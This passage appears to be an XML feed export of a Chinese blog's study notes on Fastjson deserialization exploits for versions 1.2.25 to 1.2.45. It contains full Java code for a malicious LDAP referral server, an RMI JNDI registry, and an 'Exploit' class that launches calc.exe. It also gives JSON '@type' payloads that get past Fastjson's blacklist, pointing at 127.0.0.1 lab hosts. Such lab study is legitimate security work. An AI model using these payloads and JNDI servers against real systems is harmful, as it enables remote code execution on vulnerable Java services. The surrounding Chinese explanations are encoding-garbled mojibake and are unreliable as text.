class="hljs-name">dependencies</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.45<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="LDAPæœåŠ¡æ­å»º"><a href="#LDAPæœåŠ¡æ­å»º" class="headerlink" title="LDAPæœåŠ¡æ­å»º"></a>LDAPæœåŠ¡æ­å»º</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:80/#Exploit&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¹¶ä¸”è¿™é‡Œå› ä¸ºæˆ‘æœ¬äººä¸äº†è§£å…¶ä»£ç ã€‚è¿™é‡Œçš„æ¶æ„ç±»æˆ‘æ²¡æœ‰åœ¨æ·»åŠ è‡ªå·±çš„è·¯å¾„ã€‚ï¼ˆxsw6a.Exploitï¼‰ï¼Œéœ€è¦é‡æ–°å‘phpstudyä¸­ä¼ å…¥ä¸å¸¦packageçš„æ¶æ„ç±»ã€‚</strong></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è¿™é‡Œå…¶å®è·Ÿä¹‹å‰åˆ©ç”¨TemplateImplåˆ©ç”¨é“¾å­å·®ä¸å¤šã€‚<strong>è¿™é‡Œä¼šè°ƒç”¨setteræ–¹æ³•è§¦å‘lookupï¼ˆï¼‰</strong>å¹¶ä¸”å…¶ä¸­çš„å‚æ•°å¯æ§ã€‚ä¹‹å‰æ˜¯ä¼šè°ƒç”¨getteræ–¹æ³•ã€‚ï¼ˆè¿™é‡Œè¿˜æ˜¯è¦è°ƒè¯•å¾ˆä¹…ï¼Œå¹¶ä¸”æœ‰ä¸€äº›ç±»æˆ‘ä»¬æ˜¯æ— æ³•è·Ÿè¿›å»è°ƒè¯•çš„ã€‚ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082245220.png" alt="QQæˆªå›¾20220308224443"></p><p>å¯æ§<strong>data_source</strong>,è§¦å‘æ¼æ´ã€‚</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆ1.2.25-1.2.43ï¼‰</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-43%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-43%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-43"><a href="#Fastjson1-2-25-1-2-43" class="headerlink" title="Fastjson1.2.25-1.2.43"></a>Fastjson1.2.25-1.2.43</h1><p>åœ¨è€åœ°æ–¹å¢åŠ äº†æŠ¥é”™ã€‚å¦‚æœæ˜¯å¼€å¤´ä¸¤ä¸ªLLã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082137161.png" alt="QQæˆªå›¾20220308213629"></p><p>è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ä¹‹å‰çš„ç‰ˆæœ¬ç»•è¿‡POCã€‚åˆ©ç”¨[</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>overã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆ1.2.25-1.2.42ï¼‰</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-42%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-42%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjsonï¼ˆ1-2-25-1-2-42ï¼‰"><a href="#Fastjsonï¼ˆ1-2-25-1-2-42ï¼‰" class="headerlink" title="Fastjsonï¼ˆ1.2.25-1.2.42ï¼‰"></a>Fastjsonï¼ˆ1.2.25-1.2.42ï¼‰</h1><p>å¢åŠ äº†é»‘åå•ã€‚è¿‡æ»¤äº†<strong>Lã€ï¼›</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082116245.png" alt="QQæˆªå›¾20220308210454"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082128495.png" alt="QQæˆªå›¾20220308212311"></p><p>ä½†æ˜¯è¿™é‡Œå´æ˜¯ä¸€ä¸ªå¾ªç¯åˆ é™¤ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082128978.png" alt="QQæˆªå›¾20220308212625"></p><p>æ‰€ä»¥æ²¡å•¥ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆ1.2.25-1.2.41ï¼‰</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-41%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-41%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-41"><a href="#Fastjson1-2-25-1-2-41" class="headerlink" title="Fastjson1.2.25-1.2.41"></a>Fastjson1.2.25-1.2.41</h1><p>è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰çš„ä»£ç ã€‚</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>, <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>,referenceWrapper);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>è¿˜æ˜¯ä¹‹å‰çš„ä»£ç ã€‚ä½†æ˜¯å˜åŒ–äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954585.png" alt="QQæˆªå›¾20220308185949"></p><p>æ¸…æ¥šçš„çœ‹åˆ°ï¼Œä»–æ˜¯ä¸æ”¯æŒcom.sun.rowset.JdbcRowSetImplã€‚<br>è·Ÿè¿›ä¸€ä¸‹ä»£ç ã€‚<br>ä¸€è·¯è·Ÿè¿›ä¼šåœ¨è¿™é‡Œäº§ç”ŸæŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081922659.png" alt="QQæˆªå›¾20220308192105"></p><p>è¿™é‡Œå¾ˆæ˜¾ç„¶ç¦æ­¢äº†ä»¥com.sunå¼€å¤´çš„ç±»ã€‚</p><h2 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954160.png" alt="QQæˆªå›¾20220308192640"></p><p>å¦‚æœè¿™é‡Œæ»¡è¶³æ¡ä»¶ä¹Ÿå°±æ˜¯å¼€å¯äº†<code>autoTypeSupport</code>ï¼Œå®ç°ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>å°±ä¼šæ¥åˆ°è¿™é‡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081928989.png" alt="QQæˆªå›¾20220308192804"></p><p>ä½†æ˜¯å¼€å¯ä¹‹åï¼Œè¿™é‡Œè¿˜æ˜¯ä¼šæ»¡è¶³æ¡ä»¶ã€‚ç»§ç»­è¿›å…¥é»‘åå•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081932475.png" alt="QQæˆªå›¾20220308193159"></p><p>å»çœ‹ä¸€ä¸‹æœ€åçš„<strong>loadClass</strong>å¤„ç†ç±»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954538.png" alt="QQæˆªå›¾20220308193309"></p><p>ä¸è§£é‡Šä»£ç äº†ã€‚<strong>ä¸€ä¸ªå»å¤´ï¼Œä¸€ä¸ªå»å¤´å»å°¾ã€‚</strong><br>è¿™æ ·å°±ç»•è¿‡äº†é»‘åå•ã€‚è¯•ä¸€è¯•ã€‚</p><h2 id="æ›´æ–°æ¢ä»£POC"><a href="#æ›´æ–°æ¢ä»£POC" class="headerlink" title="æ›´æ–°æ¢ä»£POC"></a>æ›´æ–°æ¢ä»£POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>è¿™é‡Œåœ¨åŠ å…¥<code>[</code>ä¼šäº§ç”ŸæŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081951719.png" alt="QQæˆªå›¾20220308195108"></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>è¿™åº”è¯¥æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ ¼å¼ã€‚ä¸ç„¶å°±ä¼šæŠ¥é”™ã€‚å¯æ ¹æ®æç¤ºæ¥ä¿®æ”¹ã€‚overã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è‡´æ¯ä¸€ä¸ªåŠªåŠ›çš„äºº</title>
    <link href="/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/"/>
    <url>/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/</url>
    
